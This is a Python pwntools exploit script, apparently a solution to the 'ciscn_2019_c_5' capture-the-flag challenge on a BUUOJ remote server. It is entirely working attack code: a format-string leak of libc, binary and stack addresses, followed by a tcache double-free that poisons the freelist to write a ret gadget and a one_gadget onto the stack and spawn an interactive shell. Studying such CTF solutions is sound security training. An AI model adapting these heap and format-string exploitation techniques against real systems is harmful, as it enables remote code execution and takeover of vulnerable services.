from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_2019_c_5')
io = remote('node4.buuoj.cn', 26032)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('ciscn_2019_c_5')


def add(size, content):
    io.sendlineafter('Input your choice:', '1')
    io.sendlineafter('Please input the size of story: \n', str(size))
    io.sendlineafter('please inpute the story: \n', content)


def delete(index):
    io.sendlineafter('Input your choice:', '4')
    io.sendlineafter('Please input the index:\n', str(index))


def leak():
    global elf_base, libc_base, stack
    payload = '%p' * 16
    io.sendafter('What\'s your name?\n', payload)
    for i in range(6):
        io.recvuntil('0x')
    libc_base = int(io.recvn(12), 16) - libc.sym['_IO_file_setbuf'] - 9
    for i in range(9):
        io.recvuntil('0x')
    stack = int(io.recvn(12), 16)
    elf_base = int(io.recvn(14), 16) - 0xf12
    log.success('elf_base: ' + hex(elf_base))
    log.success('libc_base: ' + hex(libc_base))
    log.success('stack: ' + hex(stack))
    io.sendlineafter('Please input your ID.\n', '1')
    

def pwn():
    ret = elf_base + 0x969
    one_gadget = libc_base + 0x4f322
    add(0x30, 'a')
    delete(0)
    delete(0)
    add(0x30, p64(stack - 8))
    add(0x30, 'a')
    add(0x30, p64(ret) * 2 + p64(one_gadget))
    io.sendlineafter('Input your choice:', '6')
    io.interactive()

if __name__ == '__main__':
    leak()
    pwn()
